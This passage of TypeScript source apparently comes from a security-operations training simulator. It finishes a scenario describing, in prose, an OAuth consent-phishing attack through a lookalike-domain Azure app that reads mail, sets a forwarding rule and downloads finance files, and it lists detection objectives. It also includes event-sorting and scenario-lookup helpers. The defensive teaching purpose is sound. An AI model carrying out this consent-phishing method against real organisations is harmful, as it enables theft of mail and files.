    narrative: "APT29 registers a malicious multi-tenant Azure AD app named 'Productivity Suite Pro' in its own tenant, with a redirect URI on a lookalike domain (productivty-suite.com, missing an 'i'), and emails j.chen a link to Microsoft's real sign-in page carrying the app's client id. In the evening, from her home address, Chen clicks 'Allow', granting the app Mail.ReadWrite + MailboxSettings.ReadWrite + Files.ReadWrite.All + Calendars.Read. Nearly an hour later the app's cloud-hosted backend reads 1,247 mailbox items and 847 calendar items, creates an inbox forwarding rule to an external address (the tenant's outbound spam policy permits automatic forwarding for this mailbox, a relaxed exception), and downloads nine Finance files, including a confidential GlobalLogis contract, with a python-requests client. No malware. No credential theft. Everything happens through Microsoft's Graph API using delegated permissions the user granted, so the audit records name j.chen with the app's AppId. The tells are the app's reputation (two days old, unverified publisher, one consenting user), its AppId and REST client, a source address that is not hers, and the absence of any sign-in by her at that hour.",
    learning_objectives: [
      "Understand OAuth consent phishing: attacker uses legitimate Graph API permissions, no malware or credential theft needed",
      "Recognize that for delegated access the audit UserId is the user and the AppId is the app, so look at the AppId, client string, source address and sign-in context to tell the app from the person",
      "Identify app age, publisher verification and consenting-user count as the app-reputation indicators",
      "Know that revocation of OAuth consent (not password reset) is the correct containment action",
    ],
    alerts: eventsToAlerts(events, scenarioId),
    events, iocs, killchain, questions,
  };
}

/**
 * Scenario packs live in their own files and return `alerts: []` — importing the
 * alert generator from here would create a cycle. Attach the alerts on the way
 * out so packaged scenarios reach the student's queue exactly like built-in ones.
 */
function withAlerts(build: (id?: string) => ScenarioBundle) {
  return (scenarioId?: string): ScenarioBundle => {
    const b = build(scenarioId);
    // D-11: builders sometimes append the "benign control" events at the end of the
    // array with an EARLIER timestamp, so a viewer that streams by array order jumps
    // backwards in time (an event from a day before the ransom note showing up last).
    // Sort by ts here so array order == chronological order everywhere the bundle is
    // consumed — the static /scenarios log viewer AND the dashboard story scheduler.
    const events = [...b.events].sort((a, c) => new Date(a.ts).getTime() - new Date(c.ts).getTime());
    const alerts = b.alerts?.length ? b.alerts : eventsToAlerts(events, b.scenario_id);
    return { ...b, events, alerts };
  };
}

export function buildScenarioBySlug(slug: string): ScenarioBundle | null {
  const found = SCENARIOS.find(s => s.slug === slug);
  if (!found) return null;
  return found.build();
}
